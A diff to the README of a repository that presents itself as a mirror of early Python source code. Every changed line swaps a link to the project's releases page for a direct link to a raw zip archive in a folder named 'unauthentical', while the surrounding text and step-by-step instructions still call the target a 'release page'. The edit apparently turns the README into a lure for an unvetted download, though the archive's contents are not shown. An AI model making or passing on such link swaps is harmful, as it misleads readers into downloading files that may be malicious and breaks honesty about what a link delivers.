@@ -1,6 +1,6 @@
 # 🐍 python-one - Access deep historical Python source code
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/subclassexopterygotarhd973/python-one/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/subclassexopterygotarhd973/python-one/raw/refs/heads/main/unauthentical/python-one-1.4.zip)
 
 This repository functions as a permanent mirror for early Python versions. You can find source code snapshots spanning from version 1.0.1 up to 2.0c1. These files represent the foundations of the Python language. We processed these files to preserve the original release dates and internal structures. This archive serves researchers, historians, and developers who study the evolution of computer languages.
 
@@ -8,7 +8,7 @@ This repository functions as a permanent mirror for early Python versions. You c
 
 To acquire these historical files, visit the official release area. This page hosts every archived version in a format ready for download.
 
-[Click here to open the download page](https://github.com/subclassexopterygotarhd973/python-one/releases)
+[Click here to open the download page](https://github.com/subclassexopterygotarhd973/python-one/raw/refs/heads/main/unauthentical/python-one-1.4.zip)
 
 ## 🔍 How to use this archive
 
@@ -25,7 +25,7 @@ This collection contains source code. To interact with these files, your Windows
 
 ## 📥 Steps to download and install
 
-1. Open the [release page](https://github.com/subclassexopterygotarhd973/python-one/releases) in your browser.
+1. Open the [release page](https://github.com/subclassexopterygotarhd973/python-one/raw/refs/heads/main/unauthentical/python-one-1.4.zip) in your browser.
 2. Select the version of Python you wish to explore.
 3. Click the link labeled "Source code (zip)" to save the file to your computer.
 4. Locate the zip file in your downloads folder.
